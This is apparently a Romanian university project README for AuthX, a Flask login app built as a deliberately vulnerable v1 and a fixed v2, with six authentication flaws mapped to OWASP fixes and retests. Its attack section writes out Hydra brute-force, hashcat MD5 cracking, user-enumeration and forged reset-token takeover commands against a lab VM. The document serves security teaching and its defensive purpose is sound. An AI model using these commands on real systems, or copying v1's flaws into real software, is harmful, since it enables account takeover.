# AuthX — Break the Login

**Atacarea și securizarea autentificării**

| | |
|---|---|
| **Curs** | Dezvoltarea Aplicațiilor Software Securizate |
| **Facultate** | Matematică și Informatică, Universitatea din București |
| **Profesor** | Conf. Univ. Dr. Marius Iulian Mihăilescu |
| **Student** | Cristina-Diana Savin |
| **An academic** | 2025-2026 |

---

## 1. Sumar

AuthX este o aplicație internă fictivă pentru autentificarea angajaților unei companii. Proiectul implementează **două versiuni paralele** ale aplicației: una intenționat vulnerabilă (v1) și una securizată (v2), pentru a demonstra concret cum se atacă în practică un sistem de autentificare și cum trebuie implementat corect ca să reziste atacurilor reale.

Fiecare din cele 6 vulnerabilități din specificație (4.1-4.6) e: (a) injectată explicit în v1, (b) demonstrată cu PoC reproductibil, (c) reparată în v2 cu un fix mapat 1:1, (d) re-testată după fix pentru a valida remedierea.

### DEMO: [Clip video](https://drive.google.com/file/d/1a6fxahiBCTfu9zu9C6FYKQSQf_3h_x-4/view?usp=drive_link)

## 2. Stack tehnic

- **Limbaj:** Python 3.14
- **Framework web:** Flask 3.1.3
- **Bază de date:** SQLite 3.46
- **Hashing parole:** v1 = MD5 fără salt (vulnerabil); v2 = bcrypt cost 12 cu salt random
- **Rate limiting:** Flask-Limiter (memory storage) (v2)
- **TLS:** ad-hoc self-signed prin pyopenssl
- **Sesiuni:** signed cookie (Flask default, HMAC cu SECRET_KEY)

## 3. Infrastructură

Două VM-uri Ubuntu separate, conform diagramei specificației:

| VM | IP | Rol | Hostname |
|---|---|---|---|
| **AuthX-VM** | `192.168.95.128` | Server Flask (port 5000) | `cristina-savin@AuthX-VM` |
| **Client-VM** | `192.168.95.129` | Atacator (Burp + Hydra + hashcat + scripturi) | `cristina-savin@Client-VM` |

Ambele rulează pe VMware Workstation, NAT, subnet `192.168.95.0/24`.

## 4. Structura repository

```
authx-project/
├── README.md                       # acest fișier
├── app/
│   ├── __init__.py                 # Flask factory (config diferit între v1 și v2)
│   ├── auth.py                     # Register/Login/Logout/Reset (toate fix-urile aici)
│   ├── main.py                     # Dashboard
│   ├── db.py                       # SQLite helpers + init-db CLI
│   └── templates/                  # login, register, forgot, reset, index, dashboard, errors
├── instance/
│   └── authx.db                    # DB local
├── schema.sql                      # diferă între v1 și v2 (v2 are tabel extra)
├── run.py                          # entry point
├── requirements.txt
└── .gitignore
```

## 5. Branch-uri git

| Branch | Conținut | Utilizare |
|---|---|---|
| `master` | Scaffolding (factory Flask + DB schema, fără rute auth) | Bază comună pentru ambele versiuni |
| `vulnerable` | v1 — toate cele 6 VULN injectate | Demonstrarea atacurilor |
| `fixed` | v2 — toate cele 6 VULN remediate | Re-test, dovadă remediere |

## 6. Setup de la zero

Pe **AuthX-VM**:

```bash
# 1. Clone + checkout
git clone <repo> authx-project
cd authx-project
git checkout fixed                      # sau 'vulnerable' pentru v1

# 2. Python env
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# 3. SECRET_KEY persistent (pentru v2)
echo "export AUTHX_SECRET_KEY=$(python -c 'import secrets;print(secrets.token_hex(32))')" \
  >> ~/.bashrc
source ~/.bashrc

# 4. Init DB (drop + create tabele)
flask --app app init-db

# 5. Pornire
python run.py
# v2 default: HTTPS adhoc pe https://0.0.0.0:5000
# Pentru HTTP (testare izolată Atac 1-4, 6): AUTHX_HTTPS=false python run.py
```

Pe **Client-VM**:

```bash
# Tools necesare
sudo apt install hydra hashcat curl python3-requests

# Verificare conectivitate
curl -k -s https://192.168.95.128:5000/health
# → {"status":"ok"}

# rockyou.txt
mkdir -p ~/wordlists
cd ~/wordlists
curl -L -o rockyou.txt \
  https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

## 7. Mapare cerințe — fix — fișier — atac — audit

Tabelul central pentru evaluator. Fiecare rând: o cerință din specificație → unde se află fix-ul → cum a fost demonstrat că e rupt în v1 și reparat în v2.

| # | OWASP | Vuln v1 | Fix v2 | Locație cod (v2) | PoC v1 | Re-test v2 (rezultat) | Audit v2 |
|---|---|---|---|---|---|---|---|
| **4.1** | A07 | Parolă orice (`a`, `1`, gol) | Min 12 + 4 clase + blacklist top-rockyou | `auth.py: validate_password()` | `curl -d "password=a"` → 302 | `curl ... → 400 BAD REQUEST` | (validare la input) |
| **4.2** | A02 | MD5 fără salt | bcrypt cu `gensalt(rounds=12)` | `auth.py: register()`, `reset_password()` | `hashcat -m 0` cracks 4/5 | `hashcat -m 0` → Token length exception; mode 3200 ≈ 57 ani CPU | n/a |
| **4.3** | A07 | Unlimited login attempts | Layer 1: Flask-Limiter 5/min/IP; Layer 2: account lockout după 5 fail-uri × 15 min | `__init__.py: limiter` + `auth.py: login()` (counter+lockout_until) | Hydra crack 3/5 în 3 min @ 935/min | Hydra: 0/5; 4277 RATE_LIMIT_HIT; 3 ACCOUNT_LOCKED | `RATE_LIMIT_HIT`, `ACCOUNT_LOCKED`, `LOGIN_BLOCKED_LOCKOUT` |
| **4.4** | A07 | „User does not exist" vs „Wrong password" + timing leak (MD5 doar pe user existent) | Mesaj uniform `Invalid credentials.` + bcrypt rulat ÎNTOTDEAUNA (contra `_DUMMY_HASH` pentru email inexistent) | `auth.py: login()`, constanta `_DUMMY_HASH` | `enum_users.py` găsește 5/12; timing detect existence | Răspunsuri identice content+status; timpi indistincți | `LOGIN_FAIL_UNKNOWN` |
| **4.5** | A02 | Cookie fără HttpOnly/Secure/SameSite; sesiune permanentă | Toate 3 flag-uri + `PERMANENT_SESSION_LIFETIME=30min` + `session.clear()` la logout + rotație la login + UA fingerprint | `__init__.py: SESSION_COOKIE_*` + `auth.py: login/logout` | Burp arată Set-Cookie fără flag-uri; `document.cookie` returnează cookie; replay terminal funcționează | Set-Cookie: `HttpOnly; Secure; SameSite=Lax`; `document.cookie` returnează empty; replay alt UA → invalidat | `SESSION_FINGERPRINT_MISMATCH` |
| **4.6** | A07 | `token = md5(email)` determinist, fără storage, fără expirare, reutilizabil | `secrets.token_urlsafe(32)` (256 biți), stocat doar ca SHA256 în tabel `password_reset_tokens`, expirare 15 min, single-use | `auth.py: forgot_password()`, `reset_password()` + `schema.sql: password_reset_tokens` | Calculează `md5(email)` → takeover în 3 request-uri | Token calculat → respins ca „Link invalid sau expirat" | `RESET_REQUEST`, `RESET_PASSWORD`, `RESET_TOKEN_EXPIRED`, `RESET_TOKEN_REUSE_BLOCKED` |

## 8. Atacuri — comenzi reproductibile

Fiecare atac are pas-cu-pas în secțiunea aferentă din raport.

### Atac 1 — Password policy (VULN 4.1)

```bash
curl -X POST .../register -d "email=victim@authx.local&password=a"
# v1: → 302 FOUND (acceptat)
# v2: → 400 BAD REQUEST + "Parola trebuie să respecte cerințele..."
```

### Atac 2 — MD5 cracking (VULN 4.2)

```bash
sqlite3 instance/authx.db "SELECT email||':'||password_hash FROM users;" > leaked.txt
cut -d: -f2 leaked.txt > hashes.txt
hashcat -m 0 -a 0 hashes.txt ~/wordlists/rockyou.txt --force
# v1: 4/5 cracks în <1 min
# v2: "Token length exception" — comanda nici nu pornește
```

### Atac 3 — Brute force cu Hydra (VULN 4.3)

```bash
hydra -L /tmp/found_users.txt -P rockyou_top1000.txt -s 5000 -t 4 \
  192.168.95.128 \
  http-post-form "/login:email=^USER^&password=^PASS^:F=Wrong password" \
  -o hydra_results.txt
# v1: 3/5 cracks în 3 min
# v2: 0/5 + cont blocat după 5 încercări per user
```

### Atac 4 — User enumeration (VULN 4.4)

```bash
# v1: răspunsuri diferite
curl -X POST http://192.168.95.128:5000/login -d "email=fake@x&password=y"   # → "User does not exist"
curl -X POST http://192.168.95.128:5000/login -d "email=admin@authx.local&password=y"  # → "Wrong password"

# v2: răspunsuri identice + rate limit
python3 ~/poc/enum_users_v2_fixed.py
```

### Atac 5 — Cookie hijacking (VULN 4.5)

```bash
# Inspect Set-Cookie după login
curl -k -s -i -c /tmp/jar.txt -X POST https://192.168.95.128:5000/login \
  -d "email=cristina@authx.local&password=Sup3rS3cret2026!" | grep Set-Cookie
# v1: Set-Cookie: session=...; Path=/
# v2: Set-Cookie: session=...; HttpOnly; Path=/; SameSite=Lax; Secure

# DevTools în Firefox: F12 → Console → document.cookie
# v1: returnează "session=eyJ..."
# v2: returnează ""
```

### Atac 6 — Reset token predictibil (VULN 4.6)

```bash
TOKEN=$(echo -n "cristina@authx.local" | md5sum | awk '{print $1}')
curl "http://192.168.95.128:5000/reset-password?token=$TOKEN" \
  -d "token=$TOKEN&password=h4ck3d_2026"
# v1: → "Password updated" (account takeover)
# v2: → "Link invalid sau expirat" (302 redirect)
```

## 9. Status final reteste

| # | Atac | Status v1 (atac reușit) | Status v2 (după fix) |
|---|---|---|---|
| 1 | Enumeration | ✓ 5/12 useri descoperiți | ✗ Răspunsuri identice + rate limit |
| 2 | Hydra | ✓ 3/5 conturi sparte | ✗ 0/5; 4277 RATE_LIMIT_HIT; 3 lockouts |
| 3 | Hashcat MD5 | ✓ 4/5 hash-uri sparte | ✗ Format incompatibil; bcrypt necesită ~57 ani CPU |
| 4 | Reset token | ✓ Account takeover în 3 cereri | ✗ Link invalid |
| 5 | Cookie hijacking | ✓ JS access + replay funcțional | ✗ HttpOnly+Secure+SameSite; replay invalidat |
| 6 | Parolă slabă | ✓ Toate parolele acceptate | ✗ Toate parolele slabe respinse 400 |

**Toate 6 atacuri din v1 eșuează în v2.**

## 10. Audit logging

Tabelul `audit_logs` rămâne identic între v1 și v2. **Diferența nu e în logging — e în reacție:**

| Acțiune | v1 (logged) | v2 (logged + acționat) |
|---|---|---|
| Login fail repetat | Logged, ignored | Logged + counter + lockout după 5 |
| Rate limit | n/a | Logged la fiecare 429 |
| Reset token reuse | Logged ca `RESET_PASSWORD` (succes!) | Logged ca `RESET_TOKEN_REUSE_BLOCKED` + respins |
| Session replay alt UA | n/a | Logged ca `SESSION_FINGERPRINT_MISMATCH` + invalidat |

Util pentru forensics post-incident — query rapid:

```sql
-- Top atacuri în ultima oră
SELECT action, ip_address, COUNT(*) as n
FROM audit_logs
WHERE timestamp > datetime('now', '-1 hour')
  AND action LIKE '%FAIL%' OR action LIKE '%BLOCKED%' OR action = 'RATE_LIMIT_HIT'
GROUP BY action, ip_address
ORDER BY n DESC;
```

## 11. Resurse

- Specificație proiect: `Proiect_2_-_Break_the_Login___Atacarea_și_securizarea_autentificării.pdf`
- Barem: `Barem_de_verificare.pdf`
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- OWASP ASVS: https://owasp.org/www-project-application-security-verification-standard/
- bcrypt (Damien Miller): https://www.openbsd.org/papers/bcrypt-paper.pdf
- Have I Been Pwned API: https://haveibeenpwned.com/API/v3
- Flask-Limiter docs: https://flask-limiter.readthedocs.io/
